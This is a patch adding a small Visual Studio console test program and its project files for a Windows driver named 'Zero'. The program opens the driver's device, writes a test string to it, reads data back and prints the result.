++    <Filter Include="Driver Files">
++      <UniqueIdentifier>{8E41214B-6785-4CFE-B992-037D68949A14}</UniqueIdentifier>
++      <Extensions>inf;inv;inx;mof;mc;</Extensions>
++    </Filter>
++  </ItemGroup>
++  <ItemGroup>
++    <ClCompile Include="Source.cpp">
++      <Filter>Source Files</Filter>
++    </ClCompile>
++  </ItemGroup>
++</Project>
+\ No newline at end of file
+diff --git a/ZeroDriver/ZeroTest/ZeroTest.cpp b/ZeroDriver/ZeroTest/ZeroTest.cpp
+new file mode 100644
+index 0000000..a7c25eb
+--- /dev/null
++++ b/ZeroDriver/ZeroTest/ZeroTest.cpp
+@@ -0,0 +1,35 @@
++#include <stdio.h>
++#include <Windows.h>
++
++int main(int argc, char* argv[]) {
++
++	HANDLE hDevice = CreateFileW(L"\\\\.\\Zero", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
++	if (hDevice == INVALID_HANDLE_VALUE) {
++		printf("Error opening device (%u)\n", GetLastError());
++		return 1;
++	}
++
++	char test[13] = "test string\0";
++    DWORD bytes_ret;
++    // Write to the driver
++    if (!WriteFile(hDevice, test, sizeof(test), &bytes_ret, NULL)) {
++        printf("WriteFile failed: %d\n", GetLastError());
++    }
++    else {
++        printf("WriteFile succeeded, bytes written: %d\n", bytes_ret);
++    }
++
++    // Read from the driver
++    if (!ReadFile(hDevice, test, sizeof(test), &bytes_ret, NULL)) {
++        printf("ReadFile failed: %d\n", GetLastError());
++    }
++    else {
++        printf("ReadFile succeeded, bytes read: %d\n", bytes_ret);
++       // printf("Data set to zeroes: %.*s\n", bytes_ret, test);  // Display the data read
++        printf("test string: %s", test);
++    }
++
++	printf("Success!!");
++
++	CloseHandle(hDevice);
++}
+diff --git a/ZeroDriver/ZeroTest/ZeroTest.vcxproj b/ZeroDriver/ZeroTest/ZeroTest.vcxproj
+new file mode 100644
+index 0000000..04fa3c0
+--- /dev/null
++++ b/ZeroDriver/ZeroTest/ZeroTest.vcxproj
+@@ -0,0 +1,136 @@
++<?xml version="1.0" encoding="utf-8"?>
++<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
++  <ItemGroup Label="ProjectConfigurations">
++    <ProjectConfiguration Include="Debug|Win32">
++      <Configuration>Debug</Configuration>
++      <Platform>Win32</Platform>
++    </ProjectConfiguration>
++    <ProjectConfiguration Include="Release|Win32">
++      <Configuration>Release</Configuration>
++      <Platform>Win32</Platform>
++    </ProjectConfiguration>
++    <ProjectConfiguration Include="Debug|x64">
++      <Configuration>Debug</Configuration>
++      <Platform>x64</Platform>
++    </ProjectConfiguration>
++    <ProjectConfiguration Include="Release|x64">
++      <Configuration>Release</Configuration>
++      <Platform>x64</Platform>
++    </ProjectConfiguration>
++  </ItemGroup>
++  <PropertyGroup Label="Globals">
++    <VCProjectVersion>17.0</VCProjectVersion>
++    <Keyword>Win32Proj</Keyword>
++    <ProjectGuid>{0279e064-9a17-469a-9847-4ace803ca697}</ProjectGuid>
++    <RootNamespace>ZeroTest</RootNamespace>
++    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
++  </PropertyGroup>
++  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
++    <ConfigurationType>Application</ConfigurationType>
++    <UseDebugLibraries>true</UseDebugLibraries>
++    <PlatformToolset>v143</PlatformToolset>
++    <CharacterSet>Unicode</CharacterSet>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
++    <ConfigurationType>Application</ConfigurationType>
++    <UseDebugLibraries>false</UseDebugLibraries>
++    <PlatformToolset>v143</PlatformToolset>
++    <WholeProgramOptimization>true</WholeProgramOptimization>
++    <CharacterSet>Unicode</CharacterSet>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
++    <ConfigurationType>Application</ConfigurationType>
++    <UseDebugLibraries>true</UseDebugLibraries>
++    <PlatformToolset>v143</PlatformToolset>
++    <CharacterSet>Unicode</CharacterSet>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
++    <ConfigurationType>Application</ConfigurationType>
++    <UseDebugLibraries>false</UseDebugLibraries>
++    <PlatformToolset>v143</PlatformToolset>
++    <WholeProgramOptimization>true</WholeProgramOptimization>
++    <CharacterSet>Unicode</CharacterSet>
++  </PropertyGroup>
++  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
++  <ImportGroup Label="ExtensionSettings">
++  </ImportGroup>
++  <ImportGroup Label="Shared">
++  </ImportGroup>
++  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
++    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
++  </ImportGroup>
++  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
++    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
++  </ImportGroup>
++  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
++    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
++  </ImportGroup>
++  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
++    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
++  </ImportGroup>
++  <PropertyGroup Label="UserMacros" />
++  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
++    <ClCompile>
++      <WarningLevel>Level3</WarningLevel>
++      <SDLCheck>true</SDLCheck>
++      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
++      <ConformanceMode>true</ConformanceMode>
++    </ClCompile>
++    <Link>
++      <SubSystem>Console</SubSystem>
++      <GenerateDebugInformation>true</GenerateDebugInformation>
++    </Link>
++  </ItemDefinitionGroup>
++  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
++    <ClCompile>
++      <WarningLevel>Level3</WarningLevel>
++      <FunctionLevelLinking>true</FunctionLevelLinking>
++      <IntrinsicFunctions>true</IntrinsicFunctions>
++      <SDLCheck>true</SDLCheck>
++      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
++      <ConformanceMode>true</ConformanceMode>
++    </ClCompile>
++    <Link>
++      <SubSystem>Console</SubSystem>
++      <EnableCOMDATFolding>true</EnableCOMDATFolding>
++      <OptimizeReferences>true</OptimizeReferences>
++      <GenerateDebugInformation>true</GenerateDebugInformation>
++    </Link>
++  </ItemDefinitionGroup>
++  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
++    <ClCompile>
++      <WarningLevel>Level3</WarningLevel>
++      <SDLCheck>true</SDLCheck>
++      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
++      <ConformanceMode>true</ConformanceMode>
++      <RuntimeLibrary>MultiThreadedDebug</RuntimeLibrary>
++    </ClCompile>
++    <Link>
++      <SubSystem>Console</SubSystem>
++      <GenerateDebugInformation>true</GenerateDebugInformation>
++    </Link>
++  </ItemDefinitionGroup>
++  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
++    <ClCompile>
++      <WarningLevel>Level3</WarningLevel>
++      <FunctionLevelLinking>true</FunctionLevelLinking>
++      <IntrinsicFunctions>true</IntrinsicFunctions>
++      <SDLCheck>true</SDLCheck>
++      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
++      <ConformanceMode>true</ConformanceMode>
++    </ClCompile>
++    <Link>
++      <SubSystem>Console</SubSystem>
++      <EnableCOMDATFolding>true</EnableCOMDATFolding>
++      <OptimizeReferences>true</OptimizeReferences>
++      <GenerateDebugInformation>true</GenerateDebugInformation>
++    </Link>
++  </ItemDefinitionGroup>
++  <ItemGroup>
++    <ClCompile Include="ZeroTest.cpp" />
++  </ItemGroup>
++  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
++  <ImportGroup Label="ExtensionTargets">
++  </ImportGroup>
++</Project>
+\ No newline at end of file
+diff --git a/ZeroDriver/ZeroTest/ZeroTest.vcxproj.filters b/ZeroDriver/ZeroTest/ZeroTest.vcxproj.filters
+new file mode 100644
+index 0000000..d6060eb
+--- /dev/null
++++ b/ZeroDriver/ZeroTest/ZeroTest.vcxproj.filters
+@@ -0,0 +1,22 @@
++﻿<?xml version="1.0" encoding="utf-8"?>
++<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
++  <ItemGroup>
++    <Filter Include="Source Files">
++      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
++      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
++    </Filter>
++    <Filter Include="Header Files">
++      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
++      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
++    </Filter>
++    <Filter Include="Resource Files">
++      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
++      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
++    </Filter>
++  </ItemGroup>
++  <ItemGroup>
++    <ClCompile Include="ZeroTest.cpp">
++      <Filter>Source Files</Filter>
++    </ClCompile>
++  </ItemGroup>
++</Project>
+\ No newline at end of file
